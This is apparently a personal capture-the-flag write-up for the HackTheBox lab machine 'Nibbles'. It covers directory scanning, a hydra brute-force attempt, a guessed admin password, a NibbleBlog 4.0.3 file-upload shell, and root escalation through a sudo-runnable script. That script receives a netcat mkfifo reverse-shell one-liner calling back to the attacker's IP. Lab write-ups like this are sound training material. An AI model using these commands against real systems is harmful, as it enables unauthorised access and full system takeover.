<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Nibbles</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Nibbles</h1><br/>1. Upon doing a regular nmap scan, not much is returned, only ports 22 and 80.<br />2. When you go to the website on port 80, we dont find much either. To further look into the website, I did a FeroxBuster scan useing the command:<br />   <div class="codebox"><pre>feroxbuster -u http<span style="color:#bf2e5e;font-weight:400">://</span>10.10.10.75 --smart -w <span style="color:#bf2e5e;font-weight:400">/</span>usr<span style="color:#bf2e5e;font-weight:400">/</span>share<span style="color:#bf2e5e;font-weight:400">/</span>dirb<span style="color:#bf2e5e;font-weight:400">/</span>wordlists<span style="color:#bf2e5e;font-weight:400">/</span>big.txt</pre></div><br />3. This scan returned a lot of URL links that were not found in smaller scans:<br />      <a href=""><img src="images/7-1.png" alt="images/7-1.png" /></a><br />4. From there, I went to teh “/nibbleblog/” link and was greeted by an actual website. <br />5. After looking around a bit, I went to the “/nibbleblog/admin/” link which returned directories<br />6. I went to the /views/dashboard directory and found the &quot;quick_start.bit&quot; file. This file showed me the link to the admin login page. <br />     <a href=""><img src="images/7-2.png" alt="images/7-2.png" /></a><br />7. From there, visiting the admin page, (&lt;IP&gt;/nibbleblog/admin.php?) you see that it is pretty sad looking and can likely be cracked using hydra. So I gave it a go using the command:<br />     <div class="codebox"><pre>hydra -l admin -P <span style="color:#bf2e5e;font-weight:400">/</span>usr<span style="color:#bf2e5e;font-weight:400">/</span>share.wordlists<span style="color:#bf2e5e;font-weight:400">/</span>rockyou.txt 10.10.10.75 http-post-form <span style="color:#5ebdab;font-weight:400">&quot;/nibbleblog/admin.php:username=admin&amp;password=^PASS^:Login&quot;</span> </pre></div><br />10. This returns a lot of passwords, none of which are correct. Just going off of what we know, we happen to try “nibbles&quot; (the name of the blog). This lets us in.<br />11. Looking around on the admin page, you can see a “General Settings” tab. Clicking this will show you the version number at the bottom of the page:<br />    <a href=""><img src="images/7-3.png" alt="images/7-3.png" /></a><br />12. Now doing a google search for &quot;nibbleblog 4.0.3 exploit&quot; brings us to a lot of pages that tell us about an arbitrary file upload that can be acomplished using either a script or metasploit. We will try it without metasploit first.<br />13. Following the guide here: <a href="https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html">https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html</a>, we first visit the webpage:<br />            <a href="http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image">http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;action=config&amp;plugin=my_image</a><br />14. Then, we upload a php reverse shell (I like the one from github personally), fire up our netcat listener, and then browse to that image at: <a href="http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php">http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php</a><br />15. Viola! We have a shell! I tried getting a better shell and just ended up breaking the shell multiple times, so the shell we have will have to do for now. We can find the user flag in “home/nibbler/user.txt”<br />16. While in that directory, we can unzip the “Personal” file in there and we find that (after running “sudo -l”) we can run that file with root permissions. <br />17. We can then fire up the netcat listener on our system and on the remote system use the commands:<br />      <div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">echo</span> <span style="color:#5ebdab;font-weight:400">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR IP HERE&gt; 5555 &gt;/tmp/f&quot;</span> &gt; monitor.sh<br /><span style="color:#bf2e5e;font-weight:400">sudo</span> .<span style="color:#bf2e5e;font-weight:400">/</span>monitor.sh</pre></div><br />18. This gives us a root shell! Go into the root directory and grab that flag!</div>
</body>
</html>
